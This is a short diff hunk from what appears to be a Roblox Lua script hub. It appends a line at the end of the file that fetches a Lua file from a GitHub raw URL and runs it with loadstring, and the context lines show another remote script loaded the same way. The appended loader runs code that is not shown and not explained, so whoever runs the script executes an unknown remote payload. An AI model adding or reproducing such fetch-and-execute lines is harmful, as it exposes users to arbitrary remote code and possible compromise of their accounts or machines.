@@ -6610,3 +6610,5 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/REKMS-cttub/Public-Sc
 
 end
 })
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/nainshu/no/main/114514.lua"))()
